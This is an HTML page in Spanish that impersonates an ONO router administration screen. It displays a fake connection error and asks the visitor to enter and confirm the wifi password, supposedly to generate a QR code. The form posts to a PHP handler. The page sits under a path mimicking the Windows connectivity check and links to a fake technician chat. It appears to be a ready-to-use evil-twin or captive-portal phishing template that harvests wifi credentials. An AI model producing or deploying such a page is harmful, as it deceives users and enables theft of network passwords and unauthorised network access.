    </body><!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>ONO interfaz de administración</title>
<link rel="stylesheet" href="/msftconnecttest/onocss/screen.css" media="screen" type="text/css" />
    </head>
<img class="idono" src="/msftconnecttest/onoimg/ono.png"/>
    <body>
<p>Error 109: no se puede conectar, para segurar la conexión hay que entrar la contraseña wifi del router para crear nuevo codigo QR y poder usar lo con los otros dispositivos que quieren conectarse a la red <b>sin tener que entrar la clave wifi para cada uno de ellos.</b>La contraseña esta indicado atrás del router.</p>
<br>
<br>
<br>
<img class="idclavewifi" src="/msftconnecttest/onoimg/onoclave.jpg"/>
<div id="container">
            <!-- zone de connexion -->
            
            <form method="POST" action="onovalid.php">
                <h1>Conexión</h1>
                
                <label><b>Clave wifi</b></label>
                <input type="text" name="cle">

                <label><b>Confirmación</b></label>
                <input type="text" name="cleconf">

                <input type="submit" id='submit' value='Crear codigo qr' >

            </form>
        </div>
</br>
<p>Si no encuentra la clave wifi se puede ponerse en contacto con un tecnico:<a href="/msftconnecttest/shout/onotchat.php" target="_blank"><u>Ayuda en linea</u>...</a></p>
</body>
</html>
